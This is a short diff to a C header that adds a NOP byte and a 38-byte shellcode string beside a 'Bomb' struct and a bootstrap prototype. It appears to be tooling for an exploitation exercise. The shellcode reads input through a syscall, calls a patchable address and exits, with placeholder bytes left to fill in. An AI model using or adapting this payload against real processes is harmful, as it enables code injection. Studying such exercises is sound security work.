@@ -49,6 +49,24 @@ typedef struct
   Symbol  object[NUM_OBJECT];     /* List of important objects */
 } Bomb;
 
+#define NOP                 '\x90'
+
+#define SHELLCODE_MAIN      "\x31\xc0" \
+                            "\xb0\x03" \
+                            "\x31\xdb" \
+                            "\xb9\xff\xff\xff\xff" \
+                            "\x31\xd2" \
+                            "\xb2\x64" \
+                            "\xcd\x80" \
+                            "\x48\x31\xff" \
+                            "\xbf\xff\xff\xff\xff" \
+                            "\xe8\xff\xff\xff\xff" \
+                            "\x31\xc0" \
+                            "\xff\xc0" \
+                            "\x31\xdb" \
+                            "\xcd\x80"
+#define SHELLCODE_MAIN_LEN  38
+
 int
 bootstrap (Bomb* bomb);
 
